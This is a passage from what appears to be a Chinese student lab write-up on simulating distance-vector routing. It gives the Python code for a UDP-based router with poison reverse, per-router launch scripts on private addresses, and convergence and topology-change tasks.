<span class="comment">#路由表字典，(key,value)=(dest,&#123;nextHop,cost&#125;)，初始时，路由表仅有邻居节点</span></span><br><span class="line">        self.__rtrTable = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> dest <span class="keyword">in</span> self.__neighbor:</span><br><span class="line">            self.__rtrTable[dest] = &#123;&#125;</span><br><span class="line">            self.__rtrTable[dest][<span class="string">'nextHop'</span>] = dest</span><br><span class="line">            self.__rtrTable[dest][<span class="string">'cost'</span>] = self.__neighbor[dest][<span class="string">'cost'</span>]</span><br><span class="line">        self.__neighCost = &#123;&#125;  <span class="comment">#邻居链路的开销，(key, value) = (nextHop, cost)</span></span><br><span class="line">        <span class="keyword">for</span> nextHop <span class="keyword">in</span> self.__neighbor:</span><br><span class="line">            self.__neighCost[nextHop] = self.__neighbor[nextHop][<span class="string">'cost'</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment">#改变链路距离的一方发送距离改变信息在头部加上的标记</span></span><br><span class="line">        self.__linkChangeFlag = <span class="string">'*'</span></span><br><span class="line">        <span class="comment">#链路断开的一方发送连接断开信息在头部加上的标记</span></span><br><span class="line">        self.__linkDownFlag = <span class="string">'#'</span></span><br><span class="line"></span><br><span class="line">        self.__rtrTable_history = <span class="literal">None</span>  <span class="comment">#上次更新的路由表</span></span><br><span class="line">        self.__convergedPrintTimes = <span class="number">0</span>  <span class="comment">#路由表收敛后控制其只输出一次</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#逆向毒化(poison reverse)算法的开启标志，默认为开启状态</span></span><br><span class="line">        self.__PoisonReverse = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__updateTimer</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''为了方便观察,此处更新定时器的目标函数将打印路由表，</span></span><br><span class="line"><span class="string">        向邻居发送路由表结合在一起。'''</span></span><br><span class="line">        self.__showrt()</span><br><span class="line">        self.__sendRtrTable()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__showrt</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''此处当相邻两次</span></span><br><span class="line"><span class="string">        的路由表相同，则认为路由收敛（实际可能未收敛）'''</span></span><br><span class="line">        <span class="string">'''打印样例</span></span><br><span class="line"><span class="string">        Distance vector list is:</span></span><br><span class="line"><span class="string">        +-------------+---------+------+</span></span><br><span class="line"><span class="string">        | destination | nexthop | cost |</span></span><br><span class="line"><span class="string">        +-------------+---------+------+</span></span><br><span class="line"><span class="string">        |      B      |    B    |  2   |</span></span><br><span class="line"><span class="string">        |      E      |    E    |  2   |</span></span><br><span class="line"><span class="string">        |      C      |    B    |  10  |</span></span><br><span class="line"><span class="string">        |      D      |    E    |  8   |</span></span><br><span class="line"><span class="string">        +-------------+---------+------+</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(self.__rtrTable) != str(self.__rtrTable_history):</span><br><span class="line">            <span class="comment">#路由表如果有更新就输出新路由表信息</span></span><br><span class="line">            print(<span class="string">'Distance vector list is:'</span>)</span><br><span class="line">            tb = pt.PrettyTable()</span><br><span class="line">            tb.field_names = [<span class="string">'destination'</span>, <span class="string">'nexthop'</span>, <span class="string">'cost'</span>]</span><br><span class="line">            <span class="keyword">for</span> dest <span class="keyword">in</span> self.__rtrTable:</span><br><span class="line">                <span class="keyword">if</span> self.__rtrTable[dest][<span class="string">'cost'</span>] &gt; self.__MaxHop:</span><br><span class="line">                    self.__rtrTable[dest][<span class="string">'cost'</span>] = self.__MaxHop + <span class="number">1</span></span><br><span class="line">                tb.add_row([</span><br><span class="line">                    dest, self.__rtrTable[dest][<span class="string">'nextHop'</span>]</span><br><span class="line">                    <span class="keyword">if</span> self.__rtrTable[dest][<span class="string">'cost'</span>] &lt;= self.__MaxHop <span class="keyword">else</span> <span class="string">' '</span>,</span><br><span class="line">                    self.__rtrTable[dest][<span class="string">'cost'</span>] <span class="keyword">if</span></span><br><span class="line">                    self.__rtrTable[dest][<span class="string">'cost'</span>] &lt;= self.__MaxHop <span class="keyword">else</span> <span class="string">'inf'</span></span><br><span class="line">                ])</span><br><span class="line">            print(tb)</span><br><span class="line">            <span class="comment">#更新历史路由表，注意此处必须用深拷贝，否则会出错</span></span><br><span class="line">            self.__rtrTable_history = copy.deepcopy(self.__rtrTable)</span><br><span class="line">            self.__convergedPrintTimes = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.__convergedPrintTimes == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#如果是第一次打印就输出路由表收敛信息，否则不打印路由表</span></span><br><span class="line">                print(<span class="string">'The network has converged:'</span>)</span><br><span class="line">                tb = pt.PrettyTable()</span><br><span class="line">                tb.field_names = [<span class="string">'destination'</span>, <span class="string">'nexthop'</span>, <span class="string">'cost'</span>]</span><br><span class="line">                <span class="keyword">for</span> dest <span class="keyword">in</span> self.__rtrTable:</span><br><span class="line">                    <span class="keyword">if</span> self.__rtrTable[dest][<span class="string">'cost'</span>] &gt; self.__MaxHop:</span><br><span class="line">                        self.__rtrTable[dest][<span class="string">'cost'</span>] = self.__MaxHop + <span class="number">1</span></span><br><span class="line">                    tb.add_row([</span><br><span class="line">                        dest, self.__rtrTable[dest][<span class="string">'nextHop'</span>]</span><br><span class="line">                        <span class="keyword">if</span> self.__rtrTable[dest][<span class="string">'cost'</span>] &lt;= self.__MaxHop <span class="keyword">else</span></span><br><span class="line">                        <span class="string">' '</span>, self.__rtrTable[dest][<span class="string">'cost'</span>]</span><br><span class="line">                        <span class="keyword">if</span> self.__rtrTable[dest][<span class="string">'cost'</span>] &lt;= self.__MaxHop <span class="keyword">else</span></span><br><span class="line">                        <span class="string">'inf'</span></span><br><span class="line">                    ])</span><br><span class="line">                print(tb)</span><br><span class="line">                self.__convergedPrintTimes = <span class="number">1</span>  <span class="comment">#控制其只打印一次</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__recvRtrTable</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''用于接受邻居发来的距离向量，并更新距离向量表'''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data, addr = self.recvfrom(<span class="number">1024</span>)  <span class="comment">#接收的最大数据量bufsize = 1024</span></span><br><span class="line">                data = data.decode(encoding=<span class="string">'UTF-8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                <span class="string">'''首字节判断是否为linkChange和linkDown信息'''</span></span><br><span class="line">                <span class="keyword">if</span> data[<span class="number">0</span>] == self.__linkChangeFlag:</span><br><span class="line">                    self.__linkChange(addr, int(data[<span class="number">1</span>:]), needSend=<span class="literal">False</span>)</span><br><span class="line">                <span class="keyword">elif</span> data[<span class="number">0</span>] == self.__linkDownFlag:</span><br><span class="line">                    self.__linkDown(addr, needSend=<span class="literal">False</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.__updatertrTable(addr, json.loads(data))</span><br><span class="line">            <span class="keyword">except</span> ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__sendRtrTable</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''向所有邻居发送距离向量信息'''</span></span><br><span class="line">        <span class="keyword">for</span> nextHop <span class="keyword">in</span> self.__neighbor:</span><br><span class="line">            rtrtable = copy.deepcopy(self.__rtrTable)</span><br><span class="line">            <span class="keyword">if</span> self.__PoisonReverse:  <span class="comment">#使用逆向毒化算法</span></span><br><span class="line">                <span class="string">''' 若向目的邻居发送的距离向量中某个最佳路由下一跳为该邻居，则将跳数</span></span><br><span class="line"><span class="string">                设置为最大跳数+1（不可达）'''</span></span><br><span class="line">                <span class="keyword">for</span> dest <span class="keyword">in</span> self.__rtrTable:</span><br><span class="line">                    <span class="keyword">if</span> dest != nextHop <span class="keyword">and</span> self.__rtrTable[dest][</span><br><span class="line">                            <span class="string">'nextHop'</span>] == nextHop:</span><br><span class="line">                        rtrtable[dest][<span class="string">'cost'</span>] = self.__MaxHop + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment">#不使用逆向毒化算法</span></span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            data = json.dumps(rtrtable)</span><br><span class="line">            self.sendto(data.encode(encoding=<span class="string">'UTF-8'</span>, errors=<span class="string">'ignore'</span>),</span><br><span class="line">                        self.__rName2addr[nextHop])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__updatertrTable</span><span class="params">(self, addr, rtrtable)</span>:</span></span><br><span class="line">        <span class="string">'''更新路由表，采用距离向量算法，对于相邻路由器X发来的路由表rtrtable，</span></span><br><span class="line"><span class="string">        根据其的每一个项目（目的路由器为N）进行以下步骤：</span></span><br><span class="line"><span class="string">        若 N是自己，则什么也不做，跳过</span></span><br><span class="line"><span class="string">        否则 进行以下判断</span></span><br><span class="line"><span class="string">            若 原来的路由表没有N，则将其添加到路由表中，距离为c[X]+rtrtable[N]</span></span><br><span class="line"><span class="string">            否则 根据其自己的下一跳路由器做如下判断：</span></span><br><span class="line"><span class="string">                若 N对于自己的下一跳是X,则用c[X]+rtrtable[N]替换路由表中项目(*)，</span></span><br><span class="line"><span class="string">                否则 进行以下判断:</span></span><br><span class="line"><span class="string">                    若 c[X]+rtrtable[N]&lt;自己到N的距离，则更新路由器</span></span><br><span class="line"><span class="string">                    否则 什么也不做</span></span><br><span class="line"><span class="string">        (*)替换原因：这是最新的消息，以最新消息为准，无论替换后是变大还是变小</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        From = self.__addr2rName[addr]</span><br><span class="line">        <span class="keyword">for</span> dest <span class="keyword">in</span> rtrtable:</span><br><span class="line">            <span class="keyword">if</span> dest == self.__name:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> dest <span class="keyword">not</span> <span class="keyword">in</span> self.__rtrTable:</span><br><span class="line">                self.__rtrTable[dest] = &#123;&#125;</span><br><span class="line">                self.__rtrTable[dest][<span class="string">'nextHop'</span>] = From</span><br><span class="line">                self.__rtrTable[dest][<span class="string">'cost'</span>] = min(</span><br><span class="line">                    self.__neighCost[From] + rtrtable[dest][<span class="string">'cost'</span>],</span><br><span class="line">                    self.__MaxHop + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.__rtrTable[dest][<span class="string">'nextHop'</span>] == From:</span><br><span class="line">                self.__rtrTable[dest][<span class="string">'cost'</span>] = min(</span><br><span class="line">                    self.__neighCost[From] + rtrtable[dest][<span class="string">'cost'</span>],</span><br><span class="line">                    self.__MaxHop + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.__neighCost[From] + rtrtable[dest][</span><br><span class="line">                    <span class="string">'cost'</span>] &lt; self.__rtrTable[dest][<span class="string">'cost'</span>]:</span><br><span class="line">                self.__rtrTable[dest][<span class="string">'cost'</span>] = min(</span><br><span class="line">                    self.__neighCost[From] + rtrtable[dest][<span class="string">'cost'</span>],</span><br><span class="line">                    self.__MaxHop + <span class="number">1</span>)</span><br><span class="line">                self.__rtrTable[dest][<span class="string">'nextHop'</span>] = From</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__parseUserInput</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''输入相应命令并选择相应功能'''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                order = input().split()</span><br><span class="line">                <span class="keyword">if</span> order[<span class="number">0</span>] == <span class="string">'linkchange'</span>:</span><br><span class="line">                    addr = (order[<span class="number">1</span>], int(order[<span class="number">2</span>]))</span><br><span class="line">                    dist = int(order[<span class="number">3</span>])</span><br><span class="line">                    self.__linkChange(addr, dist, needSend=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">elif</span> order[<span class="number">0</span>] == <span class="string">'linkdown'</span>:</span><br><span class="line">                    addr = (order[<span class="number">1</span>], int(order[<span class="number">2</span>]))</span><br><span class="line">                    self.__linkDown(addr, needSend=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"InputError"</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">"InputError"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__linkChange</span><span class="params">(self, addr, dist, needSend)</span>:</span></span><br><span class="line">        <span class="string">'''链路改变函数，输入要改变的目的邻居的addr以及改变后的跳数，其中布尔变量</span></span><br><span class="line"><span class="string">        needSend表示是否向目的邻居发送改变信息，对于主动改变的一方，needSend=True，</span></span><br><span class="line"><span class="string">        对于被动接受改变的一方，needSend=False。请注意，此函数也可以用于建立邻居关系。</span></span><br><span class="line"><span class="string">        在距离改变后，立即重置self.__convergedPrintTimes和self.__rtrTable_history，</span></span><br><span class="line"><span class="string">        使其在下个周期将更新后的路由表打印出来'''</span></span><br><span class="line">        rName = self.__addr2rName[addr]</span><br><span class="line">        <span class="string">'''如果目的addr不是其邻居，会将其加入本路由器的邻居中'''</span></span><br><span class="line">        self.__neighbor[rName] = &#123;&#125;</span><br><span class="line">        self.__neighbor[rName][<span class="string">'addr'</span>] = addr</span><br><span class="line">        self.__neighbor[rName][<span class="string">'cost'</span>] = dist</span><br><span class="line">        self.__neighCost[rName] = dist</span><br><span class="line">        self.__rtrTable[rName] = &#123;&#125;</span><br><span class="line">        self.__rtrTable[rName][<span class="string">'nextHop'</span>] = rName</span><br><span class="line">        self.__rtrTable[rName][<span class="string">'cost'</span>] = dist</span><br><span class="line">        self.__convergedPrintTimes = <span class="number">0</span></span><br><span class="line">        self.__rtrTable_history = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> needSend:</span><br><span class="line">            data = self.__linkChangeFlag + str(dist)</span><br><span class="line">            self.sendto(data.encode(encoding=<span class="string">'UTF-8'</span>, errors=<span class="string">'ignore'</span>), addr)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__linkDown</span><span class="params">(self, addr, needSend)</span>:</span></span><br><span class="line">        <span class="string">'''链路断开函数，输入要断开连接的目的邻居的addr，其中布尔变量needSend表示</span></span><br><span class="line"><span class="string">        是否向目的邻居发送改变信息，对于主动改变的一方，needSend=True，对于被动接受</span></span><br><span class="line"><span class="string">        改变的一方，needSend=False。在与邻居断开连接后，将链路距离设置为最大跳数+1</span></span><br><span class="line"><span class="string">        （不可达），立即重置self.__convergedPrintTimes和self.__rtrTable_history，</span></span><br><span class="line"><span class="string">        使其在下个周期更新后的路由表打印出来'''</span></span><br><span class="line">        rName = self.__addr2rName[addr]</span><br><span class="line">        self.__neighbor.pop(rName)</span><br><span class="line">        self.__neighCost.pop(rName)</span><br><span class="line">        self.__rtrTable[rName] = &#123;&#125;</span><br><span class="line">        self.__rtrTable[rName][<span class="string">'nextHop'</span>] = rName</span><br><span class="line">        self.__rtrTable[rName][<span class="string">'cost'</span>] = self.__MaxHop + <span class="number">1</span></span><br><span class="line">        self.__convergedPrintTimes = <span class="number">0</span></span><br><span class="line">        self.__rtrTable_history = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> needSend:</span><br><span class="line">            data = self.__linkDownFlag</span><br><span class="line">            self.sendto(data.encode(encoding=<span class="string">'UTF-8'</span>, errors=<span class="string">'ignore'</span>), addr)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setPoisonReverse</span><span class="params">(self, openState)</span>:</span></span><br><span class="line">        <span class="string">'''逆向毒化算法开启状态'''</span></span><br><span class="line">        self.__PoisonReverse = openState</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''路由表开启，包含两个子线程，一个每隔时间T更新路由表，打印一次路由表，向邻居</span></span><br><span class="line"><span class="string">        发送距离向量，此处为了方便观察，将其设置为10s，另一个接受用户的输入命令。主线</span></span><br><span class="line"><span class="string">        程用于接收邻居发来的距离向量并对rtrTable做更新。'''</span></span><br><span class="line">        self.bind(self.__addr)</span><br><span class="line"></span><br><span class="line">        th1 = RepeatTimer(<span class="number">10</span>, self.__updateTimer)</span><br><span class="line">        th1.start()</span><br><span class="line">        th2 = RepeatTimer(<span class="number">0</span>, self.__parseUserInput)</span><br><span class="line">        th2.start()</span><br><span class="line"></span><br><span class="line">        self.__recvRtrTable()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RepeatTimer</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="string">'''定时器类，继承于threading.Thread类，interval为时间间隔'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, interval, target)</span>:</span></span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.interval = interval</span><br><span class="line">        self.daemon = <span class="literal">True</span></span><br><span class="line">        self.stopped = <span class="literal">False</span></span><br><span class="line">        self.target = target</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.stopped:</span><br><span class="line">            time.sleep(self.interval)</span><br><span class="line">            self.target()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_argv</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''解析运行时的参数（第一次运行时），其输入格式为</span></span><br><span class="line"><span class="string">    "python3 DVroute.py listening_port ip1 port1 dist1 ip2 port2 dist2···"，</span></span><br><span class="line"><span class="string">    后面每个三元组代表每个邻居的距离信息'''</span></span><br><span class="line">    s = sys.argv[<span class="number">1</span>:]</span><br><span class="line">    parsed = &#123;&#125;</span><br><span class="line">    listening_port = s.pop(<span class="number">0</span>)</span><br><span class="line">    parsed[<span class="string">'listening_port'</span>] = int(listening_port)</span><br><span class="line">    neighbor = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s) // <span class="number">3</span>):</span><br><span class="line">        rName = addr2rName[(s[i * <span class="number">3</span>], int(s[i * <span class="number">3</span> + <span class="number">1</span>]))]</span><br><span class="line">        neighbor[rName] = &#123;&#125;</span><br><span class="line">        neighbor[rName][<span class="string">'addr'</span>] = (s[i * <span class="number">3</span>], int(s[i * <span class="number">3</span> + <span class="number">1</span>]))</span><br><span class="line">        neighbor[rName][<span class="string">'cost'</span>] = int(s[i * <span class="number">3</span> + <span class="number">2</span>])</span><br><span class="line">    parsed[<span class="string">'neighbor'</span>] = neighbor</span><br><span class="line">    <span class="keyword">return</span> parsed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_host_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''用于查询本机ip地址，返回值为ip'''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        s.connect((<span class="string">'8.8.8.8'</span>, <span class="number">80</span>))</span><br><span class="line">        ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''主函数调用该路由器，生成一个最大跳数为15的路由器'''</span></span><br><span class="line">    ip = get_host_ip()</span><br><span class="line">    parsed = parse_argv()</span><br><span class="line">    rt = Router(router_address=(ip, parsed[<span class="string">'listening_port'</span>]),</span><br><span class="line">                neighbor=parsed[<span class="string">'neighbor'</span>],</span><br><span class="line">                addr2rName=addr2rName,</span><br><span class="line">                MaxHop=<span class="number">15</span>)</span><br><span class="line">    <span class="comment">#此处设置为逆向毒化算法为关闭状态，若要使用，将其注释即可</span></span><br><span class="line">    rt.setPoisonReverse(openState=<span class="literal">False</span>)</span><br><span class="line">    rt.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
<h3 id="shell脚本文件"><a href="#shell脚本文件" class="headerlink" title="shell脚本文件"></a>shell脚本文件</h3><p>A1.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.66</span> <span class="number">20000</span> <span class="number">2</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.69</span> <span class="number">20000</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></div>
<p>B1.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.65</span> <span class="number">20000</span> <span class="number">2</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.67</span> <span class="number">20000</span> <span class="number">8</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.69</span> <span class="number">20000</span> <span class="number">6</span></span><br></pre></td></tr></table></figure></div>
<p>C1.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.66</span> <span class="number">20000</span> <span class="number">8</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.68</span> <span class="number">20000</span> <span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>D1.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.67</span> <span class="number">20000</span> <span class="number">3</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.69</span> <span class="number">20000</span> <span class="number">6</span></span><br></pre></td></tr></table></figure></div>
<p>E1.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.65</span> <span class="number">20000</span> <span class="number">2</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.66</span> <span class="number">20000</span> <span class="number">6</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.68</span> <span class="number">20000</span> <span class="number">6</span></span><br></pre></td></tr></table></figure></div>
<p>A2.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.66</span> <span class="number">20000</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></div>
<p>B2.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.65</span> <span class="number">20000</span> <span class="number">2</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.67</span> <span class="number">20000</span> <span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>C2.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.66</span> <span class="number">20000</span> <span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>A3.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.66</span> <span class="number">20000</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></div>
<p>B3.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.65</span> <span class="number">20000</span> <span class="number">2</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.67</span> <span class="number">20000</span> <span class="number">3</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.68</span> <span class="number">20000</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<p>C3.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.66</span> <span class="number">20000</span> <span class="number">3</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.68</span> <span class="number">20000</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<p>D3.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python3 DVroute.py <span class="number">20000</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.66</span> <span class="number">20000</span> <span class="number">1</span> <span class="number">192.168</span><span class="number">.126</span><span class="number">.67</span> <span class="number">20000</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<div style="page-break-after: always;"></div>

<h2 id="任务1：模拟路由收敛"><a href="#任务1：模拟路由收敛" class="headerlink" title="任务1：模拟路由收敛"></a>任务1：模拟路由收敛</h2><h3 id="任务要求"><a href="#任务要求" class="headerlink" title="任务要求"></a>任务要求</h3><p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217221332238.png" alt="image-20191217221332238"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217221357168.png" alt="image-20191217221357168"></p>
<div style="page-break-after: always;"></div>

<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>开启A、B、C、D、E五台虚拟机，分别运行shell脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">sh 路由器名<span class="number">1.</span>sh</span><br></pre></td></tr></table></figure></div>
<p>收敛后结果如下：</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218134731276.png" alt="image-20191218134731276"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218134900957.png" alt="image-20191218134900957"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217222118525.png" alt="image-20191217222118525" style="zoom:80%;"></p>
<p>对照网络拓扑图后，验证收敛正确</p>
<h2 id="任务2：模拟拓扑变化"><a href="#任务2：模拟拓扑变化" class="headerlink" title="任务2：模拟拓扑变化"></a>任务2：模拟拓扑变化</h2><h3 id="任务要求-1"><a href="#任务要求-1" class="headerlink" title="任务要求"></a>任务要求</h3><p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217222520170.png" alt="image-20191217222520170"></p>
<div style="page-break-after: always;"></div>

<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>在任务一的基础上在B上继续输入距离改变命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">linkchange <span class="number">192.168</span><span class="number">.126</span><span class="number">.69</span> <span class="number">20000</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></div>
<p>距离改变后，A、C的路由表未发生变化，得到B、D、E变化如下</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218135011145.png" alt="image-20191218135011145"></p>
